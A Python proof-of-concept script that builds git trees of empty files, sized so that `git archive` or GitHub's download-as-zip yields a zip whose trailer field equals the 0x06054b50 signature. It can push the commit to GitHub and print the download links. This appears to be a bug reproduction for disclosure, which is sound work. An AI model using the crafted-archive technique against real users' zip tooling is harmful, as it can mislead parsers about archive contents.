#!/usr/bin/env python3

import os, sys, subprocess
import struct
import shlex

expected_repo_name = "git-archive-zip-bug-trailer-contains-additional-0x06054b50"

def main():
    import argparse
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group()
    group.add_argument("--push", action="store_true", help=
        "Push to github and print the download-as-zip link.")
    group.add_argument("--output", help=
        "Path to write the zip archive from `git archive`.")
    parser.add_argument("--adjust", type=int, default=0, help=
        "Instead of hitting the bug size exactly, miss it by the specified amount.")
    args = parser.parse_args()

    if args.push:
        url = git("remote", "get-url", "origin")
        repo_name = url.rsplit("/", 1)[1].removesuffix(".git")
        if len(repo_name) != len(expected_repo_name):
            print("WARNING: in order to reproduce this on github, the repo name must be exactly {} bytes, found: {}".format(
                len(expected_repo_name),
                repo_name,
            ), file=sys.stderr)

    # Build a big chunk of samey file entries.
    # Every file is the same empty file.
    # Make a directory that contains a bunch of copies of the empty file.
    # Make a directory that contains a bunch of copies of the above directory.
    # Make a directory that contains a bunch of copies of the above directory.
    # That kind of thing.

    empty_file_hash = git("hash-object", "-w", "--stdin", input=b'')

    # Build bottom tier tree with massive file names.
    item_line_template = "100644 blob {}\t{}\x00".format(
        empty_file_hash,
        "0" * (70 - len("00.txt")) + "{}.txt",
    )
    # Build exponentially bigger trees.
    tree_hashes = []
    for height in range(3):
        tree_hash = git("mktree", "-z", input="".join([
            item_line_template.format(str(i).zfill(2))
            for i in range(75)
        ]).encode("utf8"))
        tree_hashes.append(tree_hash)
        item_line_template = "040000 tree {}\t{}\x00".format(
            tree_hash,
            "{}",
        )
    # Now hone in on the correct value.
    tree_hash = git("mktree", "-z", input="".join([
        # The big tree:
        "040000 tree {}\t{}\x00".format(tree_hash, "aa"),
        # A medium tree:
        "040000 tree {}\t{}\x00".format(tree_hashes[1], "bb"),
    ] + [
        # Some small trees:
        "040000 tree {}\t{}\x00".format(tree_hashes[0], str(i).zfill(2))
        for i in range(2)
    ] + [
        # Several individual files:
        "100644 blob {}\t{}.txt\x00".format(empty_file_hash, str(i).zfill(2))
        for i in range(64)
    ] + [
        # Last file name's length hits it spot on:
        "100644 blob {}\t{}.txt\x00".format(empty_file_hash, "c"*(31 + args.adjust))
    ]).encode("utf8"))

    commit_hash = git("commit-tree", "-m", "poc malicious github repo demonstrating download-as-zip exploit", tree_hash)

    if args.push:
        cmd = [
            "git", "push", "origin",
            "--force",
            "{}:{}".format(commit_hash, "refs/misc/poc"),
        ]
        subprocess.run(cmd, check=True)
        print("https://github.com/thejoshwolfe/{}/tree/{}".format(expected_repo_name, commit_hash))
        print("https://github.com/thejoshwolfe/{}/archive/{}.zip".format(expected_repo_name, commit_hash))
    elif args.output:
        cmd = [
            "git", "archive", "--format=zip",
            "--prefix={}-{}/".format(expected_repo_name, commit_hash),
            "--output", args.output,
            commit_hash,
        ]
        print("$ " + shlex.join(cmd))
        subprocess.run(cmd, check=True)

        # Now query the field we just wrote.
        with open(args.output, "rb") as f:
            f.seek(-(22 + 40), os.SEEK_END)
            buf = f.read()
        assert buf[0:4] == b"PK\x05\x06", "git didn't include a 40-character comment?"
        [found] = struct.unpack("<L", buf[12:16])
        target = 0x06054b50
        if found != target:
            print("f:0x{:08x}, t:0x{:08x}, d:{}".format(found, target, found - target))

    else:
        print(commit_hash)

def git(*args, input=None):
    cmd = ["git"]
    cmd.extend(args)
    [line] = subprocess.run(cmd, check=True, stdout=subprocess.PIPE, input=input).stdout.decode("utf8").splitlines()
    return line

if __name__ == "__main__":
    main()
